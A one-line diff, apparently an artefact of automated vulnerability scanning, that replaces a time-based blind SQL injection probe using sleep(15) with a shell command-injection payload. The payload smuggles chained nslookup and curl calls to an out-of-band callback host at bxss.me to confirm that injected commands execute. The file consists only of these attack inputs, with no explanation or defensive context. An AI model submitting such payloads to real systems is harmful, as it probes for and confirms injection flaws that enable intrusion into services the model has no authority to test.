@@ -1,1 +1,1 @@
-555*if(now()=sysdate(),sleep(15),0)
+;(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)|(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)&(nslookup -q=cname hitovcpitbkcxa655d.bxss.me||curl hitovcpitbkcxa655d.bxss.me)
